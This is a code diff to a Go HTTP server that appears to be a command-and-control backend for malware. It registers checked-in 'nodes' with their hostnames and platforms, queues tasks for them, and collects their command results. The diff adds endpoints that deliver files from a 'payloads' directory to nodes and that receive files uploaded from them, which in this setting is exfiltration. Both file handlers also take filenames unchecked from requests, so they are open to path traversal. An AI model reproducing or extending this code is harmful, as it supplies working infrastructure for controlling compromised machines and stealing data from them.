@@ -4,9 +4,11 @@ import (
 	b64 "encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -61,7 +63,12 @@ func handleRequests() {
 	http.HandleFunc("/create_task", create_task_API)
 	http.HandleFunc("/get_nodes", get_nodes)
 	http.HandleFunc("/get_tasks", get_tasks)
+	http.HandleFunc("/send_file/", send_file_handler)
+	http.HandleFunc("/get_file", get_file_handler)
 	// http.HandleFunc("/getPayload", getPayload)
+
+	// Console endpoints
+	http.HandleFunc("/list_payloads", list_payloads)
 
 	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
 }
@@ -86,6 +93,29 @@ func get_tasks(w http.ResponseWriter, req *http.Request) {
 	// json, _ := json.Marshal(json_tasks)
 
 	fmt.Fprintf(w, json_tasks)
+}
+
+func list_payloads(w http.ResponseWriter, req *http.Request) {
+
+	files, err := ioutil.ReadDir("payloads/")
+	if err != nil {
+		// return nil, err
+
+		fmt.Println("Error reading payloads dir")
+		return
+	}
+	var fileNames []string
+	for _, file := range files {
+		fileNames = append(fileNames, file.Name())
+	}
+
+	json_paylods, err := sliceToJSON(fileNames)
+	if err != nil {
+		fmt.Println("couldn't decode JSON slice")
+	}
+
+	fmt.Fprintf(w, json_paylods)
+
 }
 
 func get_nodes(w http.ResponseWriter, req *http.Request) {
@@ -202,26 +232,26 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 		update_node(node_that_checked_in.ID, dt.String())
 
-		fmt.Println("Node re-checked in")
+		// fmt.Println("Node re-checked in")
 	}
 
-	// Output something pretty
-	fmt.Println()
-	fmt.Println("============= New Check in =============")
+	// // Output something pretty
+	// fmt.Println()
+	// fmt.Println("============= New Check in =============")
 
-	fmt.Println("ID: " + node_that_checked_in.ID)
-	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
-	fmt.Println("Platform: " + node_that_checked_in.Platform)
-	fmt.Println("Time: " + dt.String())
+	// fmt.Println("ID: " + node_that_checked_in.ID)
+	// fmt.Println("Hostname: " + node_that_checked_in.Hostname)
+	// fmt.Println("Platform: " + node_that_checked_in.Platform)
+	// fmt.Println("Time: " + dt.String())
 
-	fmt.Println("============= ----------- =============")
+	// fmt.Println("============= ----------- =============")
 
 	// Find that nodes task
 	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)
 
 	// This handles sending back a blank response if no task is found
 	if find_task_message != "" {
-		fmt.Println("No task for node")
+		// fmt.Println("No task for node")
 
 		// Send the blank response back
 		fmt.Fprintf(w, blank_response)
@@ -237,7 +267,7 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 		fmt.Fprintf(w, response)
 	}
 
-	fmt.Println(task_queue)
+	// fmt.Println(task_queue)
 
 	save_nodes_to_file()
 }
@@ -245,7 +275,7 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 // Handles when a node sends back the result of a task (Command output)
 func node_response(w http.ResponseWriter, req *http.Request) {
 
-	fmt.Println("A TASK HAS BEEN COMPLETED!!!!!s")
+	fmt.Println("Node has sent response!")
 
 	fmt.Println(req.Body)
 
@@ -288,7 +318,7 @@ func node_response(w http.ResponseWriter, req *http.Request) {
 	// add the result to the task array
 	task_queue[task_location].Result = response_to_task.Result
 
-	fmt.Println("NODE RESPONSE RECORDED!")
+	// fmt.Println("NODE RESPONSE RECORDED!")
 
 	fmt.Println(task_queue[task_location])
 
@@ -319,6 +349,81 @@ func nodeSendFile(w http.ResponseWriter, req *http.Request) {
 	// Sending the reponse
 	fmt.Fprintf(w, string(response))
 
+}
+
+func get_file_handler(w http.ResponseWriter, r *http.Request) {
+	// Parse the multipart form
+	err := r.ParseMultipartForm(32 << 20) // 32 MB limit
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// Get the file from the form
+	file, handler, err := r.FormFile("file")
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+
+	// Create a new file on the server with the same name as the uploaded file
+	filepath := "./uploads/" + handler.Filename
+	f, err := os.OpenFile(filepath, os.O_WRONLY|os.O_CREATE, 0666)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+
+	// Write the file to disk
+	_, err = io.Copy(f, file)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	// Return a success message
+	fmt.Fprintf(w, "File retrieved successfully: %s", handler.Filename)
+
+	fmt.Println("File moved to to path:", filepath)
+}
+
+func send_file_handler(w http.ResponseWriter, r *http.Request) {
+
+	// Get the file name from the request URL
+	filename := r.URL.Path[len("/send_file/"):]
+
+	// Check if the file exists
+	if _, err := os.Stat("payloads/" + filename); os.IsNotExist(err) {
+		http.NotFound(w, r)
+
+		fmt.Println("🚨 The file has not been found")
+		return
+	}
+
+	// Open the file
+	file, err := os.Open("payloads/" + filename)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		fmt.Println("🚨 The file can't be opened")
+
+		return
+	}
+	defer file.Close()
+
+	// Set the response header
+	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	// w.Header().Set("Content-Length", fmt.Sprintf("%d", fileStat.Size()))
+
+	fmt.Println("🙃 io.copy thing")
+	// Copy the file to the response writer
+	_, err = io.Copy(w, file)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
 }
 
 // Reads and encodes a script. Read to send to the node
